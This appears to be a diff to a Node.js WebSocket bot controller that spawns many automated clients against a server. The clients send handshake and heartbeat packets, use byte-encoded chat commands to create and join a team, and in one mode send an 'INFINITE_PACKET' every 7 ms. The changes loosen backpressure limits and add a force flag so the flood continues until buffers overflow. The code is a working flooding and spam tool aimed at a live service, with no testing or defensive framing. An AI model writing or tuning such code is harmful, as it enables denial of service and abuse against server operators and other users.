@@ -12,7 +12,8 @@ let SERVER_ONLINE = true;
 const HEARTBEAT_INTERVAL = 5000;
 const TEAM_INTERVAL = 2000;
 
-const MAX_BUFFER = 256;
+const MAX_BUFFER = 1024;
+const KILL_BUFFER = MAX_BUFFER * 10;
 
 const TEAM_CREATE_PACKET = Uint8Array.from([49,33,47,116,101,97,109,32,99,114,101,97,116,101,32,84,101,115,116,101,114,115,32,103,51,56,57,56,101,110,97,107,108,49,48]);
 const TEAM_JOIN_PACKET = Uint8Array.from([49,31,47,116,101,97,109,32,106,111,105,110,32,84,101,115,116,101,114,115,32,103,51,56,57,56,101,110,97,107,108,49,48]);
@@ -27,9 +28,17 @@ const HEARTBEATS = [
 
 const bots = new Set();
 
-function safeSend(ws, data) {
+function safeSend(ws, data, force = false) {
     if (ws.readyState !== WebSocket.OPEN) return false;
-    if (ws.bufferedAmount > MAX_BUFFER) return false;
+
+    if (ws.bufferedAmount > KILL_BUFFER) {
+        return "OVERFLOW";
+    }
+
+    if (!force && ws.bufferedAmount > MAX_BUFFER) {
+        return false;
+    }
+
     ws.send(data);
     return true;
 }
@@ -92,24 +101,6 @@ function destroyBot(bot) {
     bots.delete(bot);
 }
 
-function startInfLoop(bot) {
-    const ws = bot.ws;
-
-    function loop() {
-        if (bot.destroyed) return;
-        if (!bot.joined) return;
-        if (CURRENT_MODE !== 1) return;
-
-        if (ws.bufferedAmount <= MAX_BUFFER) {
-            ws.send(INFINITE_PACKET);
-        }
-
-        setTimeout(loop, 10);
-    }
-
-    loop();
-}
-
 function attachBotHandlers(bot) {
     const ws = bot.ws;
 
@@ -119,7 +110,7 @@ function attachBotHandlers(bot) {
 
         safeSend(ws, Uint8Array.from([48]));
         safeSend(ws, buildIntroPacket());
-        safeSend(ws, TEAM_CREATE_PACKET);
+        safeSend(ws, TEAM_CREATE_PACKET, true);
 
         bot.intervals.push(setInterval(() => {
             if (bot.destroyed) return;
@@ -127,7 +118,8 @@ function attachBotHandlers(bot) {
             const packet = HEARTBEATS[bot.hbIndex % 2];
             bot.hbIndex++;
 
-            safeSend(ws, packet);
+            const res = safeSend(ws, packet, true);
+            if (res === "OVERFLOW") destroyBot(bot);
 
         }, HEARTBEAT_INTERVAL));
 
@@ -135,7 +127,8 @@ function attachBotHandlers(bot) {
             if (bot.destroyed) return;
 
             if (!bot.joined && ws.readyState === WebSocket.OPEN) {
-                safeSend(ws, TEAM_JOIN_PACKET);
+                const res = safeSend(ws, TEAM_JOIN_PACKET, true);
+                if (res === "OVERFLOW") destroyBot(bot);
             } else {
                 clearInterval(joinInterval);
             }
@@ -143,13 +136,25 @@ function attachBotHandlers(bot) {
 
         bot.intervals.push(joinInterval);
 
-        startInfLoop(bot);
+        const infInterval = setInterval(() => {
+            if (bot.destroyed || !bot.joined) return;
+            if (CURRENT_MODE !== 1) return;
+
+            const res = safeSend(ws, INFINITE_PACKET);
+
+            if (res === "OVERFLOW") {
+                destroyBot(bot);
+            }
+
+        }, 7);
+
+        bot.intervals.push(infInterval);
     });
 
     ws.on("message", (data) => {
         if (!bot.joined && isExactTeamJoined(data)) {
             bot.joined = true;
-            safeSend(ws, CHAT_JOIN_PACKET);
+            safeSend(ws, CHAT_JOIN_PACKET, true);
         }
     });
 
@@ -196,11 +201,8 @@ function applyConfig(newMode, newAmount) {
 
     console.log(`Mode -> ${CURRENT_MODE}, Bots -> ${TARGET_BOT_COUNT}`);
 
-    if (modeChanged) {
-        for (const bot of bots) {
-            bot.joined = false;
-            clearBotIntervals(bot);
-        }
+    for (const bot of bots) {
+        if (modeChanged) bot.joined = false;
     }
 
     ensureBotCount();
